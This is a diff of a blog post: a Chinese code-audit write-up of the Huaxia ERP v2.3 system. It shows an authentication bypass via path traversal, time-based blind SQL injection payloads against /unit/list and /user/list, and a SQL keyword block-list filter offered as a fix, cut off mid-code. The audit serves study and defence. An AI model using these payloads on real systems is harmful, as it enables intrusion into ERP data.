@@ -30,72 +30,72 @@
     <meta name="description" content="前言 这个 CMS 被用于了蓝帽杯的比赛当中，看里面挺多漏洞的，就用来挖洞练练手了 现在还是以白盒测试为主，黑盒的话我感觉我也测不出什么东西（知己知彼，百战不殆）  环境搭建 下载源码，创建jsh_erp数据库，导入sql，启动    审计准备  依赖 先看pom.xml   发现了有个fastjson1.2.55,是有漏洞的 还有log4j，但这个版本似乎没有漏洞 数据库使用了MyBatis">
 <meta property="og:type" content="article">
 <meta property="og:title" content="[代码审计]华夏ERPv2.3">
-<meta property="og:url" content="http://example.com/2025/08/22/[%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1]%E5%8D%8E%E5%A4%8FERP-CMSv2-3/index.html">
+<meta property="og:url" content="https://fub0y2026.github.io/2025/08/22/[%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1]%E5%8D%8E%E5%A4%8FERP-CMSv2-3/index.html">
 <meta property="og:site_name" content="KL">
 <meta property="og:description" content="前言 这个 CMS 被用于了蓝帽杯的比赛当中，看里面挺多漏洞的，就用来挖洞练练手了 现在还是以白盒测试为主，黑盒的话我感觉我也测不出什么东西（知己知彼，百战不殆）  环境搭建 下载源码，创建jsh_erp数据库，导入sql，启动    审计准备  依赖 先看pom.xml   发现了有个fastjson1.2.55,是有漏洞的 还有log4j，但这个版本似乎没有漏洞 数据库使用了MyBatis">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/2025/08/22/images/image-20250822180041510.png">
-<meta property="og:image" content="http://example.com/2025/08/22/images/image-20250822184141942.png">
-<meta property="og:image" content="http://example.com/2025/08/22/images/image-20250822184330415.png">
-<meta property="og:image" content="http://example.com/2025/08/22/images/image-20250822184341513.png">
-<meta property="og:image" content="http://example.com/2025/08/22/images/ignoredSuccessTest.png">
-<meta property="og:image" content="http://example.com/2025/08/22/images/image-20250822201423002.png">
-<meta property="og:image" content="http://example.com/2025/08/22/images/image-20250822201804734.png">
-<meta property="og:image" content="http://example.com/2025/08/22/images/image-20250822203039931.png">
-<meta property="og:image" content="http://example.com/2025/08/22/images/1622686796823-99845e6a-fe9e-4295-b507-4e6194ba22c7.png">
-<meta property="og:image" content="http://example.com/2025/08/22/images/1622687708448-f611dfc0-c2d4-4f19-a538-f8d88a39664e.png">
-<meta property="og:image" content="http://example.com/2025/08/22/images/image-20250822203808027.png">
-<meta property="og:image" content="http://example.com/2025/08/22/images/image-20250822204301196.png">
-<meta property="og:image" content="http://example.com/2025/08/22/images/1622691924096-c88dcb40-3f85-4a4a-a57a-c7d814c60ad3.png">
-<meta property="og:image" content="http://example.com/2025/08/22/images/1622692121609-98016382-7dfb-42d5-9d79-3fc635bd2e1c.png">
-<meta property="og:image" content="http://example.com/2025/08/22/images/image-20250822214305785.png">
-<meta property="og:image" content="http://example.com/2025/08/22/images/image-20250822214340126.png">
-<meta property="og:image" content="http://example.com/2025/08/22/images/logs.png">
-<meta property="og:image" content="http://example.com/2025/08/22/images/Sleep.png">
-<meta property="og:image" content="http://example.com/2025/08/22/images/image-20250822224255730.png">
-<meta property="og:image" content="http://example.com/2025/08/22/images/image-20250822224407201.png">
-<meta property="og:image" content="http://example.com/2025/08/22/images/image-20250822224557387.png">
-<meta property="og:image" content="http://example.com/2025/08/22/images/image-20250822225810933.png">
-<meta property="og:image" content="http://example.com/2025/08/22/images/image-20250822230118344.png">
-<meta property="og:image" content="http://example.com/2025/08/22/images/image-20250822230229622.png">
-<meta property="og:image" content="http://example.com/2025/08/22/images/image-20250823140525077.png">
-<meta property="og:image" content="http://example.com/2025/08/22/images/image-20250823140632450.png">
-<meta property="og:image" content="http://example.com/2025/08/22/images/image-20250823141127248.png">
-<meta property="og:image" content="http://example.com/2025/08/22/images/image-20250823141206362.png">
-<meta property="og:image" content="http://example.com/2025/08/22/images/image-20250823141939796.png">
-<meta property="og:image" content="http://example.com/2025/08/22/images/image-20250823141948151.png">
-<meta property="og:image" content="http://example.com/2025/08/22/images/image-20250823144853295.png">
-<meta property="og:image" content="http://example.com/2025/08/22/images/OpenCalc.png">
-<meta property="og:image" content="http://example.com/2025/08/22/images/SuccessFastjson.png">
-<meta property="og:image" content="http://example.com/2025/08/22/images/image-20250823155110340.png">
-<meta property="og:image" content="http://example.com/2025/08/22/images/ban.png">
-<meta property="og:image" content="http://example.com/2025/08/22/images/image-20250823151032501.png">
-<meta property="og:image" content="http://example.com/2025/08/22/images/image-20250823151159408.png">
-<meta property="og:image" content="http://example.com/2025/08/22/images/image-20250823151350455.png">
-<meta property="og:image" content="http://example.com/2025/08/22/images/image-20250823151610665.png">
-<meta property="og:image" content="http://example.com/2025/08/22/images/image-20250823151725059.png">
-<meta property="og:image" content="http://example.com/2025/08/22/images/image-20250823152919885.png">
-<meta property="og:image" content="http://example.com/2025/08/22/images/image-20250823153604856.png">
-<meta property="og:image" content="http://example.com/2025/08/22/images/1622875216268-a6cf93cb-2ac1-4b8f-8c3c-6b0bf95887de.png">
-<meta property="og:image" content="http://example.com/2025/08/22/images/deleteUser.png">
-<meta property="og:image" content="http://example.com/2025/08/22/images/BatDeleteUser.png">
-<meta property="og:image" content="http://example.com/2025/08/22/images/deteleUserByID.png">
-<meta property="og:image" content="http://example.com/2025/08/22/images/deleteAdmin.png">
-<meta property="og:image" content="http://example.com/2025/08/22/images/FailedLogin.png">
-<meta property="og:image" content="http://example.com/2025/08/22/images/1622880804511-ebe3fe1f-cf4f-40a7-9213-d1268e5447c8.png">
-<meta property="og:image" content="http://example.com/2025/08/22/images/1622880844416-fc1faa8f-152c-4a38-a7fe-a4cbf7a809f4.png">
-<meta property="og:image" content="http://example.com/2025/08/22/images/updateUserController.png">
-<meta property="og:image" content="http://example.com/2025/08/22/images/updateUserNoJudge.png">
-<meta property="og:image" content="http://example.com/2025/08/22/images/getUserListByloginName.png">
-<meta property="og:image" content="http://example.com/2025/08/22/images/getUserListByUserName.png">
-<meta property="og:image" content="http://example.com/2025/08/22/images/1622882405042-70c5e283-c458-4fbc-b19a-1ec284f30ba2.png">
-<meta property="og:image" content="http://example.com/2025/08/22/images/1622882341922-68530c94-5301-477d-9b6e-96e922dd6efc.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/image-20250822180041510.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/image-20250822184141942.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/image-20250822184330415.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/image-20250822184341513.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/ignoredSuccessTest.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/image-20250822201423002.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/image-20250822201804734.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/image-20250822203039931.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/1622686796823-99845e6a-fe9e-4295-b507-4e6194ba22c7.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/1622687708448-f611dfc0-c2d4-4f19-a538-f8d88a39664e.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/image-20250822203808027.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/image-20250822204301196.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/1622691924096-c88dcb40-3f85-4a4a-a57a-c7d814c60ad3.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/1622692121609-98016382-7dfb-42d5-9d79-3fc635bd2e1c.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/image-20250822214305785.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/image-20250822214340126.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/logs.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/Sleep.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/image-20250822224255730.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/image-20250822224407201.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/image-20250822224557387.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/image-20250822225810933.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/image-20250822230118344.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/image-20250822230229622.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/image-20250823140525077.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/image-20250823140632450.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/image-20250823141127248.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/image-20250823141206362.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/image-20250823141939796.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/image-20250823141948151.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/image-20250823144853295.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/OpenCalc.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/SuccessFastjson.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/image-20250823155110340.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/ban.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/image-20250823151032501.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/image-20250823151159408.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/image-20250823151350455.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/image-20250823151610665.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/image-20250823151725059.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/image-20250823152919885.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/image-20250823153604856.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/1622875216268-a6cf93cb-2ac1-4b8f-8c3c-6b0bf95887de.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/deleteUser.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/BatDeleteUser.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/deteleUserByID.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/deleteAdmin.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/FailedLogin.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/1622880804511-ebe3fe1f-cf4f-40a7-9213-d1268e5447c8.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/1622880844416-fc1faa8f-152c-4a38-a7fe-a4cbf7a809f4.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/updateUserController.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/updateUserNoJudge.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/getUserListByloginName.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/getUserListByUserName.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/1622882405042-70c5e283-c458-4fbc-b19a-1ec284f30ba2.png">
+<meta property="og:image" content="https://fub0y2026.github.io/images/1622882341922-68530c94-5301-477d-9b6e-96e922dd6efc.png">
 <meta property="article:published_time" content="2025-08-22T08:10:11.000Z">
 <meta property="article:modified_time" content="2026-09-21T13:50:07.097Z">
 <meta property="article:author" content="FuB0Y">
 <meta property="article:tag" content="代码审计">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/2025/08/22/images/image-20250822180041510.png">
+<meta name="twitter:image" content="https://fub0y2026.github.io/images/image-20250822180041510.png">
   
   
     <link rel="alternate" href="/atom.xml" title="KL" type="application/atom+xml">
@@ -372,13 +372,13 @@
 <p>现在还是以白盒测试为主，黑盒的话我感觉我也测不出什么东西（知己知彼，百战不殆）</p>
 <h2 id="环境搭建"><a class="markdownIt-Anchor" href="#环境搭建"></a> 环境搭建</h2>
 <p>下载源码，创建jsh_erp数据库，导入sql，启动</p>
-<p><img src="../images/image-20250822180041510.png" alt="image-20250822180041510" /></p>
-<p><img src="../images/image-20250822184141942.png" alt="image-20250822184141942" /></p>
+<p><img src="/images/image-20250822180041510.png" alt="image-20250822180041510" /></p>
+<p><img src="/images/image-20250822184141942.png" alt="image-20250822184141942" /></p>
 <h2 id="审计准备"><a class="markdownIt-Anchor" href="#审计准备"></a> 审计准备</h2>
 <h3 id="依赖"><a class="markdownIt-Anchor" href="#依赖"></a> 依赖</h3>
 <p>先看pom.xml</p>
-<p><img src="../images/image-20250822184330415.png" alt="image-20250822184330415" /></p>
-<p><img src="../images/image-20250822184341513.png" alt="image-20250822184341513" /></p>
+<p><img src="/images/image-20250822184330415.png" alt="image-20250822184330415" /></p>
+<p><img src="/images/image-20250822184341513.png" alt="image-20250822184341513" /></p>
 <p>发现了有个fastjson1.2.55,是有漏洞的</p>
 <p>还有log4j，但这个版本似乎没有漏洞</p>
 <p>数据库使用了MyBatis</p>
@@ -391,7 +391,7 @@
 <p>3、访问<code>.css、.js、.jpg、.png、.gif、.ico、/user/login、/user/registerUser、/v2/api-docs</code>这些内容的时候也不需要认证。同样不严格，如：<code>.css/../home.html</code>，同样存在未授权</p>
 <p>4、最后如果用户没有权限，则跳转到登录页</p>
 <p>例如</p>
-<p><img src="../images/ignoredSuccessTest.png" alt="img" /></p>
+<p><img src="/images/ignoredSuccessTest.png" alt="img" /></p>
 <p>这里我们没有登录，但访问到了静态文件</p>
 <p><strong>思考：</strong></p>
 <p>根据上面的推断，可能存在未授权漏洞</p>
@@ -401,9 +401,9 @@
 <p>在<code>pom.xml</code>文件中看到使用的是Mybatis ，所以我们按照Mybatis 的审计思路来</p>
 <p>全局搜索 <code>$&#123;</code> 以及 <code>like</code>，<code>in</code> 以及 <code>order by</code>。</p>
 <p>尽量找Mapper文件目录中的xml文件</p>
-<p><img src="../images/image-20250822201423002.png" alt="image-20250822201423002" /></p>
+<p><img src="/images/image-20250822201423002.png" alt="image-20250822201423002" /></p>
 <p>我们点开一个看看,<code>UnitMapperEx.xml</code></p>
-<p><img src="../images/image-20250822201804734.png" alt="image-20250822201804734" /></p>
+<p><img src="/images/image-20250822201804734.png" alt="image-20250822201804734" /></p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;selectByConditionUnit&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;com.jsh.erp.datasource.entities.UnitExample&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;com.jsh.erp.datasource.mappers.UnitMapper.BaseResultMap&quot;</span>&gt;</span></span><br><span class="line">        select *</span><br><span class="line">        FROM jsh_unit</span><br><span class="line">        where 1=1</span><br><span class="line">        <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;name != null&quot;</span>&gt;</span></span><br><span class="line">            and name like &#x27;%$&#123;name&#125;%&#x27;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">        and ifnull(delete_flag,&#x27;0&#x27;) !=&#x27;1&#x27;</span><br><span class="line">        <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;offset != null and rows != null&quot;</span>&gt;</span></span><br><span class="line">            limit #&#123;offset&#125;,#&#123;rows&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <p>这个语句是 <strong>动态 SQL</strong>，所以不同参数会生成不同的 SQL。</p>
 <p>MySQL 的 <code>ifnull(expr, value)</code> 语法：</p>
@@ -423,19 +423,19 @@
 <p>这种like型的模糊查询使用了不安全的拼接，会直接参与SQL语句的编译，恶意构造会导致SQL注入</p>
 <p>回溯判断对应的参数是否可控，搜索&quot; <code>selectByConditionUser</code> &quot;：</p>
 <p>来到<code>UserMapperEx.java</code>:</p>
-<p><img src="../images/image-20250822203039931.png" alt="image-20250822203039931" /></p>
+<p><img src="/images/image-20250822203039931.png" alt="image-20250822203039931" /></p>
 <p>是一个数据处理层的接口类，继续搜索<code>&quot; UserMapperEx.selectByConditionUser&quot;</code> 看具体在哪里调用：</p>
 <p>来到<code>UserService.java</code>:</p>
-<p><img src="../images/1622686796823-99845e6a-fe9e-4295-b507-4e6194ba22c7.png" alt="image.png" /></p>
+<p><img src="/images/1622686796823-99845e6a-fe9e-4295-b507-4e6194ba22c7.png" alt="image.png" /></p>
 <p>看到service层的调用，继续搜索<code>&quot; UserService.select( &quot;</code>：</p>
 <p>来到<code>UserComponent.java</code>：</p>
-<p><img src="../images/1622687708448-f611dfc0-c2d4-4f19-a538-f8d88a39664e.png" alt="image.png" /></p>
+<p><img src="/images/1622687708448-f611dfc0-c2d4-4f19-a538-f8d88a39664e.png" alt="image.png" /></p>
 <p>可以看到参数userName，loginName是从search字段中获取，判断参数应该是可控的。</p>
 <p>下面的目的就是找前端接口，也就是Controller层的方法接口映射。</p>
 <p>UserComponent类实现了ICmmonQuery这个接口，调用了此接口下的select方法</p>
-<p><img src="../images/image-20250822203808027.png" alt="image-20250822203808027" /></p>
+<p><img src="/images/image-20250822203808027.png" alt="image-20250822203808027" /></p>
 <p>在它的同目录下，发现<code>interfaceContainer.java</code>：</p>
-<p><img src="../images/image-20250822204301196.png" alt="image-20250822204301196" /></p>
+<p><img src="/images/image-20250822204301196.png" alt="image-20250822204301196" /></p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.jsh.erp.service;</span><br><span class="line">...</span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InterfaceContainer</span> &#123;</span><br><span class="line">    <span class="comment">//定义了一个 HashMap，key 是 String，value 是 ICommonQuery 对象</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, ICommonQuery&gt; configComponentMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">	<span class="comment">//Spring 会自动注入所有实现了 ICommonQuery 接口 的 Bean，放进这个数组 configComponents。</span></span><br><span class="line">	<span class="comment">//required = false 表示：如果当前系统里没有任何实现类，也不会报错（允许为空）。</span></span><br><span class="line">    <span class="meta">@Autowired(required = false)</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ICommonQuery[] configComponents)</span> &#123;</span><br><span class="line">        <span class="comment">//循环所有 ICommonQuery 的实现类。</span></span><br><span class="line">        <span class="keyword">for</span> (ICommonQuery configComponent : configComponents) &#123;</span><br><span class="line">            <span class="comment">//获取类上的 @ResourceInfo 注解</span></span><br><span class="line">            <span class="type">ResourceInfo</span> <span class="variable">info</span> <span class="operator">=</span> AnnotationUtils.getAnnotation(configComponent, ResourceInfo.class);</span><br><span class="line">            <span class="keyword">if</span> (info != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">//如果有 @ResourceInfo 注解，就取出它的值（value）并存入 Map</span></span><br><span class="line">                configComponentMap.put(info.value(), configComponent);</span><br><span class="line">                <span class="comment">//这样，所有实现类都被注册到 configComponentMap 里，以 注解里的值 作为 key。</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">//提供一个方法，按名字获取对应的组件。</span></span><br><span class="line">    <span class="keyword">public</span> ICommonQuery <span class="title function_">getCommonQuery</span><span class="params">(String apiName)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> configComponentMap.get(apiName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>这里调用初始化函数init()，将service组件压入configComponentMap中，后续调用getCommonQuery方法根据传进来的apiName获取对应的service组件（具体apiName跟对应的service组件映射如下：user-&gt;UserComponent）</p>
 <p>所以完整的调用流程是：</p>
@@ -458,10 +458,10 @@
 </ol>
 <p>所以InterfaceContainer类起到的是一个中转分发的作用，关键在于哪个类调用getCommonQuery方法，并传递相应的apiName进去，搜一下<code>&quot; getCommonQuery( &quot;</code>：</p>
 <p>来到<code>CommonQueryManager.java</code>:</p>
-<p><img src="../images/1622691924096-c88dcb40-3f85-4a4a-a57a-c7d814c60ad3.png" alt="image.png" /></p>
+<p><img src="/images/1622691924096-c88dcb40-3f85-4a4a-a57a-c7d814c60ad3.png" alt="image.png" /></p>
 <p>这里判断传进来的apiName是否为控，继续搜索 <code>&quot; CommonQueryManager &quot;</code>：</p>
 <p>来到<code>ResourceController.java</code>:</p>
-<p><img src="../images/1622692121609-98016382-7dfb-42d5-9d79-3fc635bd2e1c.png" alt="image.png" /></p>
+<p><img src="/images/1622692121609-98016382-7dfb-42d5-9d79-3fc635bd2e1c.png" alt="image.png" /></p>
 <p>终于到Controller层了，上图已经很清楚，实例化CommonQueryManager类的一个对象configResourceManager去调用select方法，传入apiName，与参数集合paramterMap。</p>
 <p>而我们一开始回溯搜索的<code>selectByConditionUnit</code>实现方法就是在<code>service\unit\UnitService.java</code>，所以这里我们需要的apiName 的值就是unit</p>
 <p>那么我们正向总结一下：</p>
@@ -483,16 +483,16 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;name&quot;:&quot;&#x27; AND SLEEP(5)-- jsh&quot;&#125;</span><br><span class="line">url编码：</span><br><span class="line">%7b%22name%22%3a%22&#x27;%20AND%20SLEEP(5)--%20jsh%22%7d</span><br></pre></td></tr></table></figure>
 <p>传入</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/unit/list?search=%7b%22name%22%3a%22&#x27;%20AND%20SLEEP(5)--%20jsh%22%7d&amp;pageSize=10&amp;currentPage=1</span><br></pre></td></tr></table></figure>
-<p><img src="../images/image-20250822214305785.png" alt="image-20250822214305785" /></p>
+<p><img src="/images/image-20250822214305785.png" alt="image-20250822214305785" /></p>
 <p>延迟时间可以看右下角</p>
 <p>然后再看控制台</p>
-<p><img src="../images/image-20250822214340126.png" alt="image-20250822214340126" /></p>
+<p><img src="/images/image-20250822214340126.png" alt="image-20250822214340126" /></p>
 <p>也打印了SQL语句</p>
 <p>那这里就是一个sql时间盲注了</p>
 <p>相类似的 SQL 注入在这个项目里面还有很多很多，比如/user/list，和这个也是一样的，但是传值的话是：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;userName&quot;:&quot;&quot;,&quot;loginName&quot;:&quot;&#x27; AND SLEEP(5)-- jsh&quot;&#125;</span><br></pre></td></tr></table></figure>
-<p><img src="../images/logs.png" alt="img" /></p>
-<p><img src="../images/Sleep.png" alt="img" /></p>
+<p><img src="/images/logs.png" alt="img" /></p>
+<p><img src="/images/Sleep.png" alt="img" /></p>
 <h3 id="漏洞修复"><a class="markdownIt-Anchor" href="#漏洞修复"></a> 漏洞修复</h3>
 <p>如果对于应急处理，比如很多 AWD Plus 的情况下，建议是写一个 FIiter 来防御，代码如下</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebFilter;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Enumeration;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> @ author: Drunkbaby</span></span><br><span class="line"><span class="comment"> @ usages: 用于 SQL 注入的自定义防护</span></span><br><span class="line"><span class="comment"> 需要加入相应的 Servlet 环境，因为我这里是纯代码，就不打环境了</span></span><br><span class="line"><span class="comment"> @ 过滤 url：在 WebFilter 当中添加 urlPatterns</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@WebFilter(urlPatterns = &quot;/system/role/list&quot;, filterName = &quot;sqlInjectFilter&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">sqlFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig arg0)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest req, ServletResponse res, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> (HttpServletRequest) req;</span><br><span class="line">        <span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> (HttpServletResponse) res;</span><br><span class="line">        <span class="comment">// 获得所有请求参数名</span></span><br><span class="line">        <span class="type">Enumeration</span> <span class="variable">params</span> <span class="operator">=</span> request.getParameterNames();</span><br><span class="line">        <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">while</span> (params.hasMoreElements()) &#123;</span><br><span class="line">            <span class="comment">// 得到参数名</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> params.nextElement().toString();</span><br><span class="line">            <span class="comment">// 得到参数对应值</span></span><br><span class="line">            String[] value = request.getParameterValues(name);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; value.length; i++) &#123;</span><br><span class="line">                sql = sql + value[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (sqlValidate(sql)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;您发送请求中的参数中含有非法字符&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            chain.doFilter(request, response);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 参数校验</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> str</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">sqlValidate</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        str = str.toLowerCase();<span class="comment">//统一转为小写</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">badStr</span> <span class="operator">=</span> <span class="string">&quot;select|update|and|or|delete|insert|truncate|char|into|substr|ascii|declare|exec|count|master|into|drop|execute|table&quot;</span>;</span><br><span class="line">        String[] badStrs = badStr.split(<span class="string">&quot;\\|&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span 